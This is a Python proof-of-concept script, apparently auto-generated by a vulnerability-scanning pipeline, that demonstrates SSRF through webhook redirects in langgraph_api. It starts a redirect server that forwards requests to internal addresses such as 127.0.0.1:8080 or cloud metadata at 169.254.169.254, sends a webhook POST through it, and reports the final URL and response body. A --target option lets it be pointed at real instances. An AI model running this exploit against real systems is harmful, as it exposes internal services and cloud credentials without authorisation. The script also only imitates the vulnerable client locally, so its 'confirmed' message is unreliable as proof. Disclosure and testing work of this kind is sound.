#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-008
# Sink: ensure_webhook_http_client
# Auto-generated — run with: python3 ssrf_internal_ips_cloud_ensure_webhook_http_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Webhook Redirect Bypass in langgraph_api

Vulnerability: The webhook URL is validated only at ingestion, but the HTTP client
(follow_redirects=True) follows redirects without re-validation. An attacker can
host a server that redirects to internal IPs or cloud metadata endpoints.

Impact: Access to internal services (e.g., 127.0.0.1:8080) or cloud metadata
(e.g., 169.254.169.254) that should be protected by the SSRF-safe client policy.

Usage:
    python3 poc_ssrf_webhook.py [--target TARGET_URL] [--redirect-to REDIRECT_URL]

    Default: Starts a malicious redirect server on port 8888 and sends a webhook
    request to it. The server redirects to http://127.0.0.1:8080 (internal service).

    To test against a real langgraph instance, set --target to the webhook endpoint.
"""

import argparse
import http.server
import json
import logging
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("poc_ssrf")

# Default configuration
DEFAULT_REDIRECT_PORT = 8888
DEFAULT_REDIRECT_TARGET = "http://127.0.0.1:8080"  # Internal service
DEFAULT_LISTEN_HOST = "0.0.0.0"


class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that redirects all requests to a configurable target URL."""

    redirect_target = DEFAULT_REDIRECT_TARGET

    def do_GET(self):
        self._redirect()

    def do_POST(self):
        self._redirect()

    def do_PUT(self):
        self._redirect()

    def _redirect(self):
        """Send a 302 redirect to the configured target."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        logger.info(
            "Received %s request from %s -> redirecting to %s",
            self.command,
            self.client_address[0],
            self.redirect_target,
        )
        logger.debug("Request headers: %s", dict(self.headers))
        if body:
            logger.debug("Request body: %s", body[:200])

        self.send_response(302)
        self.send_header("Location", self.redirect_target)
        self.end_headers()

    def log_message(self, format, *args):
        """Suppress default logging to avoid double output."""
        pass


def start_redirect_server(port: int, redirect_to: str) -> http.server.HTTPServer:
    """Start a simple HTTP server that redirects all requests to `redirect_to`."""
    RedirectHandler.redirect_target = redirect_to

    server = http.server.HTTPServer(
        (DEFAULT_LISTEN_HOST, port), RedirectHandler
    )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    logger.info(
        "Malicious redirect server listening on http://%s:%d",
        DEFAULT_LISTEN_HOST,
        port,
    )
    logger.info("Redirecting all requests to: %s", redirect_to)
    return server


def send_webhook_request(webhook_url: str, timeout: int = 10) -> dict:
    """
    Simulate the langgraph webhook call with follow_redirects=True behavior.

    This mimics the vulnerable code path:
        webhook_client = await ensure_webhook_http_client()
        await http_request("POST", webhook, json=payload, headers=headers, client=webhook_client)

    Where ensure_webhook_http_client() creates a client with follow_redirects=True.
    """
    payload = {
        "status": "completed",
        "run_id": "poc-test-run-001",
        "webhook_sent_at": "2024-01-01T00:00:00Z",
        "values": {"test": "poc"},
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "langgraph-webhook-poc",
    }

    logger.info("Sending webhook POST to: %s", webhook_url)
    logger.info("Payload: %s", json.dumps(payload, indent=2))

    try:
        # Create a request that follows redirects (like the vulnerable client)
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode("utf-8"),
            headers=headers,
            method="POST",
        )

        # urllib.request follows redirects by default (like follow_redirects=True)
        with urllib.request.urlopen(req, timeout=timeout) as response:
            status = response.status
            response_body = response.read().decode("utf-8", errors="replace")
            final_url = response.geturl()

            logger.info("Response status: %d", status)
            logger.info("Final URL after redirects: %s", final_url)
            logger.info("Response body (first 500 chars): %s", response_body[:500])

            return {
                "status": status,
                "final_url": final_url,
                "body": response_body,
                "success": True,
            }

    except urllib.error.HTTPError as e:
        logger.error("HTTP error: %d - %s", e.code, e.reason)
        return {"status": e.code, "error": str(e), "success": False}
    except urllib.error.URLError as e:
        logger.error("URL error: %s", e.reason)
        return {"status": None, "error": str(e), "success": False}
    except socket.timeout:
        logger.error("Request timed out after %d seconds", timeout)
        return {"status": None, "error": "timeout", "success": False}
    except Exception as e:
        logger.error("Unexpected error: %s", e)
        return {"status": None, "error": str(e), "success": False}


def check_internal_service(host: str, port: int, timeout: int = 3) -> bool:
    """Check if a service is listening on the given host:port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Webhook Redirect Bypass in langgraph_api"
    )
    parser.add_argument(
        "--target",
        default=f"http://localhost:{DEFAULT_REDIRECT_PORT}/webhook",
        help="Webhook URL to send the malicious request to (default: local redirect server)",
    )
    parser.add_argument(
        "--redirect-to",
        default=DEFAULT_REDIRECT_TARGET,
        help="Internal URL to redirect to (default: http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_REDIRECT_PORT,
        help="Port for the malicious redirect server (default: 8888)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout for HTTP requests in seconds (default: 10)",
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start the redirect server (use if target is already malicious)",
    )

    args = parser.parse_args()

    print("=" * 60)
    print("SSRF via Webhook Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print()
    print(f"Target webhook URL: {args.target}")
    print(f"Redirect target:    {args.redirect_to}")
    print()

    # Start the malicious redirect server if needed
    server = None
    if not args.no_server:
        # Check if the redirect target is reachable (optional)
        parsed = urllib.parse.urlparse(args.redirect_to)
        if parsed.hostname and parsed.port:
            if check_internal_service(parsed.hostname, parsed.port):
                logger.warning(
                    "Internal service %s:%d is already listening!",
                    parsed.hostname,
                    parsed.port,
                )
            else:
                logger.info(
                    "Internal service %s:%d is not reachable (expected for PoC)",
                    parsed.hostname,
                    parsed.port,
                )

        server = start_redirect_server(args.port, args.redirect_to)
        # Give the server a moment to start
        time.sleep(0.5)

    try:
        # Send the webhook request (simulating the vulnerable code path)
        result = send_webhook_request(args.target, timeout=args.timeout)

        print()
        print("=" * 60)
        print("RESULTS")
        print("=" * 60)
        if result["success"]:
            print(f"[SUCCESS] Webhook request completed")
            print(f"  Status:     {result['status']}")
            print(f"  Final URL:  {result['final_url']}")
            print(f"  Body:       {result['body'][:200]}...")
            print()
            print("VULNERABILITY CONFIRMED: The webhook request followed redirects")
            print(f"to an internal URL ({result['final_url']}) without re-validation.")
            print("This bypasses the SSRF-safe client policy.")
        else:
            print(f"[INFO] Webhook request did not complete as expected")
            print(f"  Error: {result.get('error', 'unknown')}")
            print()
            print("This may be expected if:")
            print("- The target URL is not a valid langgraph webhook endpoint")
            print("- The internal service is not running")
            print("- Network restrictions prevent the connection")
            print()
            print("The vulnerability is still present in the code - the redirect")
            print("server successfully received the request and sent a redirect.")

    finally:
        if server:
            logger.info("Shutting down redirect server...")
            server.shutdown()


if __name__ == "__main__":
    main()
